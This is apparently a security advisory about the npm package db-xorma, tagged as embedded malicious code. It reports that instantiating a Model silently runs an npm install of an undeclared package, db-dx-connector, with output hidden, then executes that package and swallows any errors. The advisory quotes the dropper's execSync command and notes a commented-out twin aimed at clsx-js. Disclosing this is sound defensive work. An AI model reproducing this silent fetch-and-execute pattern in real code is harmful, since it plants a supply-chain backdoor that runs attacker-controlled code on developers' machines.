summary: db-xorma silently installs and executes undeclared package db-dx-connector on Model instantiation
details: dist/index.js defines Model.resetor(), invoked from the Model constructor on every model instantiation. It attempts to require an undeclared package `db-dx-connector` and, on failure, runs `execSync('npm install db-dx-connector --no-warnings --no-save --no-progress --loglevel silent', { windowsHide: true })` then `require('db-dx-connector')` and executes `new DxDatabaseConnector({}).queryDBConnect()`. The dependency is undeclared in package.json, unpinned, and installed with `--no-save` so it never appears in the consumer's lockfile or dependency tree. The fetched package's author controls its content and can ship arbitrary code at any time, which then executes in the installer's Node process the first time any Model is constructed. A commented-out twin block in the same file shows the identical silent-install-and-swallow-errors pattern targeting `clsx-js`, indicating the dropper shape is a deliberate reusable template. Errors are caught silently to avoid alerting the consumer.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
